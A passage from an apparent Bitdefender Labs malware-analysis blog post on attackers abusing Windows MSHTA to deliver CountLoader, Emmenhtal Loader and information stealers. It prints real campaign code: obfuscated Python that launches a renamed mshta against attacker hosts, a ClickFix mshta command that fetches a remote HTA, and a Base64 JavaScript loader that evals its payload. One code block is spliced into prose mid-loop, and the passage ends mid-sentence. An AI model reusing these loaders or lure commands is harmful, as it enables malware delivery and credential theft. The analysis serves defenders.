\u003C\u002Ftd\u003E\n  \u003Ctd style=\"border-top:none;border-left:none;border-bottom:solid windowtext 1.0pt;\n  border-right:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext .75pt;\n  mso-border-left-alt:solid windowtext .75pt;mso-border-alt:solid windowtext .75pt;\n  padding:3.75pt 3.75pt 3.75pt 3.75pt\"\u003E\n  \u003Cp\u003E\u003Cspan style=\"font-family:&quot;Aptos&quot;,sans-serif;mso-ascii-theme-font:minor-latin;\n  mso-hansi-theme-font:minor-latin\"\u003Edynamically generated C2 address\u003Co:p\u003E\u003C\u002Fo:p\u003E\u003C\u002Fspan\u003E\u003C\u002Fp\u003E\n  \u003C\u002Ftd\u003E\n \u003C\u002Ftr\u003E\n \u003C!--[if !supportMisalignedColumns]--\u003E\n \u003Ctr height=\"0\"\u003E\n  \u003Ctd width=\"455\" style=\"border:none\"\u003E\u003C\u002Ftd\u003E\n  \u003Ctd width=\"144\" style=\"border:none\"\u003E\u003C\u002Ftd\u003E\n  \u003Ctd width=\"282\" style=\"border:none\"\u003E\u003C\u002Ftd\u003E\n \u003C\u002Ftr\u003E\n \u003C!--[endif]--\u003E\n\u003C\u002Ftbody\u003E\u003C\u002Ftable\u003E\n\u003C!--kg-card-end: html--\u003E\n\u003Cp\u003E\u003Cem\u003EThis article is published for informational and educational purposes only. The information presented is based on technical research conducted by Bitdefender Labs and publicly available sources. Bitdefender does not make any legal determination regarding the activities described herein. The mention of any company, brand, domain, or individual does not constitute an accusation of illegal activity. Readers should exercise their own judgment and consult appropriate authorities or legal counsel if they believe they have been affected by any of the activities described. Domain names and URLs listed in this article are provided solely to help consumers and security professionals identify potentially harmful infrastructure. Bitdefender disclaims any liability for actions taken based on the information in this article.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003E&nbsp;\u003C\u002Fp\u003E",15,"\u002Fblog\u002Flabs\u002Ffake-xeno-roblox-discord-executor\u002F","6a0b1dc6a89a0404d6eab60a","Microsoft’s MSHTA Legacy Tool Still Powers Malware Campaigns on Windows","microsofts-mshta-legacy-malware-windows","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fmshta_flat_vector_3000w.png","2026-05-19T15:58:25.000+03:00","\u003Cp\u003E\u003Cem\u003EBitdefender security researchers have discovered that attackers continue to exploit Microsoft HTML Application Host (MSHTA), a legacy utility available by default on Windows systems that can execute VBScript and JavaScript from local or remote files.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003ECybercriminals abuse legitimate, albeit legacy, tools to push a host of malware, ranging from run-of-the-mill password stealers to advanced threats. Bitdefender’s previous investigations already revealed how attackers used LOTL tactics in a Windows and macOS malware campaign that leveraged fake “Claude Code” Google ads.\u003C\u002Fp\u003E\u003Cp\u003E“ClickFix” attacks were also used with a new LummaStealer and CastleLoader campaign, not to mention the malware used to infect the devices of people who downloaded pirated versions of Leonardo DiCaprio’s new film, One Battle After Another.\u003C\u002Fp\u003E\u003Ch2 id=\"key-findings\"\u003EKey findings\u003C\u002Fh2\u003E\u003Cul\u003E\n\u003Cli\u003EMSHTA remains a widely abused Living-off-the-Land binary (LOLBIN) despite being a legacy utility.\u003C\u002Fli\u003E\n\u003Cli\u003EAttackers use it across multiple malware categories, from commodity stealers to advanced threats.\u003C\u002Fli\u003E\n\u003Cli\u003ECampaigns frequently rely on multi-stage, fileless execution chains involving PowerShell and HTA scripts.\u003C\u002Fli\u003E\n\u003Cli\u003ESocial engineering plays a critical role, including fake software downloads and ClickFix-style lures.\u003C\u002Fli\u003E\n\u003Cli\u003EEffective defense requires both user awareness and layered technical controls.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EMicrosoft announced the deprecation of \u003Ca href=\"https:\u002F\u002Ftechcommunity.microsoft.com\u002Fblog\u002Fwindows-itpro-blog\u002Fvbscript-deprecation-timelines-and-next-steps\u002F4148301\" rel=\"noreferrer\"\u003EVBScript in the second half of 2024\u003C\u002Fa\u003E, making it available as a Feature On Demand, enabled by default. In 2027, this feature will be disabled by default, and Microsoft plans to remove it entirely from Windows.\u003C\u002Fp\u003E\u003Cp\u003EWe analyzed how attackers continue to abuse MSHTA, another legacy utility that remains available by default on Windows systems and can execute VBScript and JavaScript from local or remote files.\u003C\u002Fp\u003E\u003Cp\u003EIn recent months, we noticed an increase in detections of mshta.exe in the execution chain, indicating that it remains a relevant Living-off-the-Land binary even after standalone Internet Explorer was retired.\u003C\u002Fp\u003E\u003Cp\u003EThe activity we analyzed spans multiple malware categories.\u003C\u002Fp\u003E\u003Cp\u003EAt the lower end, MSHTA is heavily used in delivery chains for commodity stealers such as LummaStealer and Amatera, as well as loaders such as CountLoader and Emmenhtal Loader.\u003C\u002Fp\u003E\u003Cp\u003EAt the same time, it also shows up in more advanced and persistent malware campaigns, including ClipBanker and PurpleFox. This range of abuse highlights why MSHTA continues to matter to defenders: it’s not a single malware family or intrusion model. It remains useful across the spectrum from opportunistic malware delivery to long-lived compromise.\u003C\u002Fp\u003E\u003Cp\u003EDuring this investigation, we also identified recently introduced domain patterns for an HTA-based loader called CountLoader that delivers commodity malware.\u003C\u002Fp\u003E\u003Ch2 id=\"introduction\"\u003EIntroduction\u003C\u002Fh2\u003E\u003Cp\u003EAlthough Internet Explorer reached end of support on June 15, 2022, Microsoft Edge still includes an IE mode to ensure backward compatibility, with support promised at least until 2029 [2].\u003C\u002Fp\u003E\u003Cp\u003EThis reveals a broader security problem: even after companies retire legacy products, parts of their ecosystem can persist in Windows for years, supporting older workflows and enterprise compatibility requirements.\u003C\u002Fp\u003E\u003Cp\u003E&nbsp;Threat actors frequently abuse trusted, preinstalled Windows binaries to execute malicious content while relying on software already present on the system.\u003C\u002Fp\u003E\u003Cp\u003EThese binaries, commonly referred to as Living-off-the-Land binaries (LOLBINs), are valuable because they help attackers reduce the need to drop custom tools, blend into legitimate system activity, and make malicious chains harder to distinguish from benign administrative activity.\u003C\u002Fp\u003E\u003Cp\u003EMshta.exe is just one of these utilities, originally associated with Internet Explorer and capable of running HTML Applications (HTA) using the Internet Explorer rendering engine.\u003C\u002Fp\u003E\u003Cp\u003EHTA files can embed JavaScript and VBScript code, allowing script execution in the context of a trusted, signed process. Legacy components that many users consider obsolete can still serve as a convenient execution path for modern malware.\u003C\u002Fp\u003E\u003Cp\u003EThere is currently no public indication that this utility will also be removed from future versions of Windows. As long as it remains available by default, MSHTA remains relevant both as a residual administrative tool and as part of the exposed attack surface.\u003C\u002Fp\u003E\u003Ch2 id=\"legitimate-use\"\u003ELegitimate use\u003C\u002Fh2\u003E\u003Cp\u003EAlthough MSHTA is a legacy utility with more modern alternatives that offer similar capabilities, some system administrators and software developers still use it to alert users to updates or to display simple web applications without opening a browser.\u003C\u002Fp\u003E\u003Cp\u003EAround 10% of our MSHTA telemetry still consists of simple one-liner scripts that notify users about administrative tasks via javascript:alert() or vbscript:msgbox().\u003C\u002Fp\u003E\u003Cp\u003EAnother small portion of our MSHTA insights comes from seemingly legitimate login scripts executed through MSHTA one-liners that create a WScript.Shell object and run a local file in its context.\u003C\u002Fp\u003E\u003Cp\u003EThis remaining legitimate usage is important because it shows that MSHTA has not disappeared completely from real-world environments.\u003C\u002Fp\u003E\u003Cp\u003EAt the same time, these use cases are steadily becoming less common, and there are far more modern and legitimate ways to automate system administration tasks.\u003C\u002Fp\u003E\u003Cp\u003ETo accelerate this reduction in MSHTA use, we generally recommend moving away from MSHTA in administrative workflows wherever possible.\u003C\u002Fp\u003E\u003Ch3 id=\"mshta-as-a-lolbin\"\u003EMSHTA as a Lolbin\u003C\u002Fh3\u003E\u003Cp\u003ELOLBINs (Living-off-the-Land binaries) are attractive to attackers because they are signed, familiar, and often implicitly trusted within enterprise environments. When abused, they can help adversaries execute code, retrieve remote payloads, and progress an intrusion without immediately relying on obviously malicious binaries.\u003C\u002Fp\u003E\u003Cp\u003EMSHTA still fits this model well [10]. It is present by default on Windows systems, can execute script content in-memory, and can retrieve content from remote locations. These properties make it useful for stagers and loaders, allowing attackers to minimize on-disk artifacts and take advantage of a legitimate Microsoft-signed process during execution.\u003C\u002Fp\u003E\u003Cp\u003ESince the start of the year, we have observed an increase in MSHTA-related activity. Given that legitimate use of this utility is gradually fading, this trend likely reflects a rise in malicious activity rather than renewed administrative adoption.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1330\" height=\"122\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png 1330w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EIn the following sections, we’ll reveal the most prominent campaigns from our insights and show how threat actors continue to adapt MSHTA-based attacks to deliver commodity malware at scale.\u003C\u002Fp\u003E\u003Ch2 id=\"campaigns-employing-mshta\"\u003ECampaigns employing MSHTA\u003C\u002Fh2\u003E\u003Cp\u003EThe MSHTA activity we analyzed spans multiple types of malware, including commodity information stealers such as LummaStealer and Amatera, multi-stage loaders such as CountLoader and Emmenhtal Loader, banking malware such as ClipBanker, and more persistent threats such as PurpleFox.\u003C\u002Fp\u003E\u003Cp\u003EAcross these campaigns, MSHTA serves a similar purpose: it provides attackers with a built-in, Microsoft-signed utility that can retrieve and execute remote script content during the initial or intermediate stages of an infection chain.\u003C\u002Fp\u003E\u003Cp\u003EThis makes MSHTA especially useful for malware delivery. In some cases, it is used to launch HTA-based loaders directly from attacker-controlled infrastructure. In others, it is embedded into broader chains involving phishing, fake software installers, ClickFix-style lures or scripted downloaders.\u003C\u002Fp\u003E\u003Cp\u003EOur insights show that MSHTA most commonly appeared in campaigns that delivered stealers and loaders. This is significant because these malware families are often used to gain an initial foothold, steal credentials and browser-stored data, hijack sessions, and deliver additional payloads that can deepen the compromise.\u003C\u002Fp\u003E\u003Cp\u003EThis means that what may begin as the execution of a seemingly innocuous legacy Windows utility can quickly lead to account theft, financial fraud, data loss, or broader infection of the affected system.\u003C\u002Fp\u003E\u003Cp\u003EThis pattern is consistent with MSHTA’s role as a lightweight execution and staging mechanism. It is well-suited for retrieving obfuscated HTA content, launching in-memory scripts, and handing off execution to PowerShell, \u003Ca\u003EWScript\u003C\u002Fa\u003E, msiexec, or a final malware payload.\u003C\u002Fp\u003E\u003Ch2 id=\"lummastealer-and-amatera-via-countloader\"\u003ELummaStealer and Amatera via CountLoader\u003C\u002Fh2\u003E\u003Cp\u003EOne of the most prominent MSHTA-related clusters in our telemetry involved \u003Cem\u003ECountLoader\u003C\u002Fem\u003E, an HTA-based loader used to deliver commodity malware, most notably the information stealers \u003Cem\u003ELummaStealer \u003C\u002Fem\u003Eand \u003Cem\u003EAmatera\u003C\u002Fem\u003E.\u003C\u002Fp\u003E\u003Cp\u003EThese threats are relevant to users because their primary goal is to steal sensitive data, including credentials, browser-stored information, session tokens, and cryptocurrency-related data. In this delivery chain, MSHTA plays an important role as a lightweight execution mechanism that retrieves and launches the next-stage HTA payload from remote infrastructure.\u003C\u002Fp\u003E\u003Cp\u003EThe vast majority of detections for mshta.exe come from instances where the command line contains domains that appear to be legitimate services but are hosted on the .cc TLD (e.g., google-services[.]cc, memory-scanner[.]cc). \u003C\u002Fp\u003E\u003Cp\u003EThis campaign began to gain traction toward the end of 2025, peaked at the end of January 2026, and has since declined gradually as attackers shifted to other platforms to host the payloads.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Ff345a134-6d83-4d6b-89ce-4c6669013d47.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"901\" height=\"119\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Ff345a134-6d83-4d6b-89ce-4c6669013d47.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Ff345a134-6d83-4d6b-89ce-4c6669013d47.png 901w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThese domains are often labeled as LummaStealer infrastructure on VirusTotal because Lumma is often the final payload delivered through this chain, and the same domains often appear in Lumma-related configurations.\u003C\u002Fp\u003E\u003Cp\u003EHowever, the loader appears to be distinct and can be correlated with existing reports of CountLoader [5], [6]. We also observed the same loader chain delivering Amatera, another commodity information stealer.\u003C\u002Fp\u003E\u003Cp\u003EThe lures used in this \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fblog\u002Flabs\u002Flummastealer-second-life-castleloader\"\u003Ecampaign\u003C\u002Fa\u003E are similar to those employed by CastleLoader [7].\u003C\u002Fp\u003E\u003Cp\u003EVictims are enticed through messages, social media posts, or SEO-poisoned websites that promise free or cracked software. The downloaded archive may include the password directly in its filename or contain a document indicating the password to use.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fbc56be63-7ca9-43bd-9f48-1361891ab51d.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"152\" height=\"212\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003EArchive content with Python interpreter disguised as setup\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe victim executes a Setup.exe file, which is in fact a legitimate Python interpreter. Alongside Setup.exe, the archive contains one or more \u003Cstrong\u003Epython3&lt;X&gt;.dll\u003C\u002Fstrong\u003E files that the interpreter automatically loads.\u003C\u002Fp\u003E\u003Cp\u003EThese are legitimate Python core DLLs, but during Python runtime initialization, they cause the local Lib directory to be used for dependency resolution and basic module loading. In the analyzed sample, the malicious Python script resided in \u003Cstrong\u003E.\\Lib\\encodings\\aliases.py\u003C\u002Fstrong\u003E and was launched through the corresponding \u003Cstrong\u003E__init__.py\u003C\u002Fstrong\u003E file.\u003C\u002Fp\u003E\u003Cp\u003EThe same directory also contains a renamed MSHTA executable, iso2022.exe. The malicious aliases.py script launches this binary to contact the C2 infrastructure and retrieve the HTA loader.\u003C\u002Fp\u003E\u003Cp\u003ETo construct the malicious URLs, the Python code defines individual characters as global variables and combines them through formatted strings before finally invoking os.system(cmd) to execute the resulting command line.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E### Regions\n\nglobal_region = f'{ctype}d Lib{typeB}encodings'\nlocal_format = f'{ptype}{typeE}org{typeA}wp{typeD}{atype}{typeA}{gtype}{typeA}stats{typeE}{ltype}'\nen_UK = f'{htype}{ttype}{ttype}p{stype}{typeC}{typeB}{typeB}'\nen_US = f'{typeE}{ctype}{ctype}'\nen_ES = f'iso2022{typeE}e{xtype}e'\n\n### Protection\nmem_protect = f'{global_region} {typeH}{typeH} {en_ES} {en_UK}{local_format}'\nram_protect = f'alpha{typeD}centavr{typeE}{ctype}{ctype}'\nrem_protect = f'{ctype}{mtype}d {typeA}{ctype} {stype}{ttype}ar{ttype} {typeA}b \\\"\\\" {ctype}{mtype}d {typeA}{ctype} '\n\n### Probes\npositive_probe = f'{mem_protect} {typeH} {en_ES} {en_UK}{ram_protect}'\nnegative_probe = f'{rem_protect}'\n\ncmd = f'{positive_probe}'\nos.system(cmd)\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe resulting command line is:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Ecd Lib\\encodings &amp;&amp; iso2022.exe https:\\\\planetitude[.]org\u002Fwp-admin\u002Fchellenge\u002Fstats.location &amp; iso2022[.]exe https:\\\\alpha-centavr[.]cc\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe HTA decodes the next payload from an array of character codes and launches it. The variable names seem to be generated from a dictionary of technical terms, and they vary from file to file.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-2.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"248\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-2.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-2.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003ECountLoader payload decode function\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-3.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"656\" height=\"1296\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-3.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-3.png 656w\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003ECountLoader killchain\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EStarting in late February 2026, we observed a new \u003Cem\u003ECountLoader \u003C\u002Fem\u003Edomain-hosting pattern. The naming convention remained similar, using domains that imitate legitimate service names, but the infrastructure shifted to .vg and .gl TLDs.\u003C\u002Fp\u003E\u003Cp\u003EExamples include \u003Cstrong\u003Eexplorer[.]vg, ccleaner[.]gl\u003C\u002Fstrong\u003E, and \u003Cstrong\u003Emicroservice[.]gl\u003C\u002Fstrong\u003E. The HTA scripts embedded at these locations follow the same obfuscation pattern observed in the earlier .cc-based infrastructure.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-4.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"570\" height=\"260\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003EMSHTA with .vg or .gl domains\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"emmenhtal-loader\"\u003EEmmenhtal Loader\u003C\u002Fh2\u003E\u003Cp\u003EAnother prominent MSHTA-based infection chain we observed involved \u003Cem\u003EEmmenhtal Loader\u003C\u002Fem\u003E [3], a multi-stage loader used to deliver commodity malware, including information stealers such as \u003Cem\u003ELummaStealer\u003C\u002Fem\u003E. In this campaign, MSHTA serves as an early-stage execution mechanism that retrieves and launches a remote HTA payload, which then unfolds through multiple script-based stages.\u003C\u002Fp\u003E\u003Cp\u003EThe infection chain begins with phishing messages on Discord that contain links to pages designed to hijack the clipboard and trick the user into executing a malicious command line as part of a fake human-verification process.\u003C\u002Fp\u003E\u003Cp\u003EThese pages resemble legitimate reCAPTCHA systems, but are hosted on suspicious websites (e.g. \u003Cstrong\u003Ehumancheck[.]shop\u002Fpass-this-step-to-continue[.]html\u003C\u002Fstrong\u003E) and include JavaScript code that copies a malicious command line to the clipboard when the user accesses the page.\u003C\u002Fp\u003E\u003Cp\u003EThe user is then lured into pressing Win + R to open the Run dialog, followed by Ctrl + V and Enter to paste and execute the command. As a result, explorer.exe appears to legitimately launch mshta.exe with a command line such as:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta[.]exe hxxps[:\u002F\u002F]buck2nd[.]oss-eu-central-1[.]aliyuncs[.]com\u002Fdir\u002Fsixth\u002Fsingl6[.]mp4 # &nbsp;✅ ''I am not a robot - reCAPTCHA Verification ID: 2165\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EAlthough these websites are often taken down quickly by their hosting providers, some server responses remain available on VirusTotal and can still be analyzed.\u003C\u002Fp\u003E\u003Cp\u003EThe file hosted on the server is a valid HTA, but it is intentionally bloated with large amounts of garbage data that are ignored during execution. Embedded within this content are a few valid HTML blocks that contain the malicious script. The file is never written to disk; instead, it is executed directly in memory by mshta.exe.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-5.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"234\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-5.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-5.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe HTML structure is spread across the file, inserted between unusable data that is ignored. First, it sets the MSHTA window to 1x1 pixels, starts it minimized, and hides it from the taskbar to evade detection.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-6.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"528\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-6.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-6.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003ENext, the HTML body invokes the script entry point:\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-7.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"2000\" height=\"379\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-7.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F05\u002Fimage-7.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1600\u002F2026\u002F05\u002Fimage-7.png 1600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw2400\u002F2026\u002F05\u002Fimage-7.png 2400w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe script block contains a minimal JavaScript loader that implements a Base64 decoding function and includes a large Base64-encoded string as a variable. The main function decodes and executes the embedded script.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E&lt;script&gt;\nfunction HbQIdLwSSIRvbVXZWLOwjRQqttuGTqKP(b64) {\n    var VonICsfLpEqDZndPtRRVmRdurFjpCMUv=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+\u002F\";\n    var pad=0;\n    if(b64.length&gt;=2 &amp;&amp; b64.substr(b64.length-2)===\"==\"){pad=2;b64=b64.substr(0,b64.length-2);}\n    else if(b64.length&gt;=1 &amp;&amp; b64.substr(b64.length-1)===\"=\"){pad=1;b64=b64.substr(0,b64.length-1);}\n    var out=[];\n    var i=0;\n    while(i&lt;b64.length){\n        var e1=VonICsfLpEqDZndPtRRVmRdurFjpCMUv.indexOf(b64.charAt(i++));\n        var e2=VonICsfLpEqDZndPtRRVmRdurFjpCMUv.indexOf(b64.charAt(i++));\n        var e3=VonICsfLpEqDZndPtRRVmRdurFjpCMUv.indexOf(b64.charAt(i++));\n        var e4=VonICsfLpEqDZndPtRRVmRdurFjpCMUv.indexOf(b64.charAt(i++));\n\n        var c1=(e1&lt;&lt;2)|(e2&gt;&gt;4);\n        var c2=((e2&amp;15)&lt;&lt;4)|(e3&gt;&gt;2);\n        var c3=((e3&amp;3)&lt;&lt;6)|e4;\n        out.push(c1&amp;0xFF);\n        if(e3!==64&amp;&amp;e3!==-1) out.push(c2&amp;0xFF);\n        if(e4!==64&amp;&amp;e4!==-1) out.push(c3&amp;0xFF);\n    }\n    if(pad&gt;0) out.splice(out.length-pad,pad);\n\n    var rECeQYjgakLNnbZcTJmkoefcDPJScPAz=\"\";\n    for(var x=0;x&lt;out.length;x++){\n        rECeQYjgakLNnbZcTJmkoefcDPJScPAz+=String.fromCharCode(out[x]);\n    }\n    return rECeQYjgakLNnbZcTJmkoefcDPJScPAz;\n}\n\nvar rDiPjSLADFoHqVucyLWWZenMlZdunYAi = &lt;B64_script_redacted_for_size&gt;;\n\nfunction ZGnRfrBcHrSGXLgAhCCMsyQTuwRQHDQT() {\n    var cxabulitGWnsgaALcqJZHzjkKyjdyyyo = HbQIdLwSSIRvbVXZWLOwjRQqttuGTqKP(rDiPjSLADFoHqVucyLWWZenMlZdunYAi);\n    eval(cxabulitGWnsgaALcqJZHzjkKyjdyyyo);\n}\n&lt;\u002Fscript&gt;\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe decoded result is a second-stage loader that includes the same Base64 routine and two decryption functions. The apparent size of this script is misleading, as it includes hundreds of lines of small helper functions that are never actually called.\u003C\u002Fp\u003E\u003Cp\u003EIts purpose is to decrypt a string stored in a global variable and create a WScript.Shell object, and launch the decoded script in that new WScript environment, still under the execution chain initiated by mshta.exe.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Evar cDhmBQsxdNEUHhzpdeyyybZMzVNANXtp = &lt;redacted_encrypted_payload&gt;\nvar LevylKBNaEDCESWQQeQznakYNfOEICxk = &lt;redacted_decryption_key&gt;\nvar VFjTZSncvgnebyEyMwfLTieiopsaYfQZ = &lt;redacted_b64_string&gt;\n\nfunction initMain() {\n    var stg1 = from_base64(VFjTZSncvgnebyEyMwfLTieiopsaYfQZ);\n    var stg2 = VQGTmVqlpKoSesHrvqRZECwHNdrdrDRX(stg1, LevylKBNaEDCESWQQeQznakYNfOEICxk);\n    var EYgUwBZqUyrgJIRdiVDwqyUHlgusmKOr = xor_decrypt(stg2, cDhmBQsxdNEUHhzpdeyyybZMzVNANXtp);\n    var decoded_payload_script = \"\";\n    for(var i=0; manually reversing it is almost impossible. However, with script block logging and some tooling, we can reconstruct the final layer of script that was executed.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-8.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"394\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-8.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-8.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe final, deobfuscated version of the PowerShell script consists of two parts. The first one is an AMSI bypass by patching clr.dll, possibly taken from a publicly available GitHub repository [4]. After the AMSI bypass, there is a 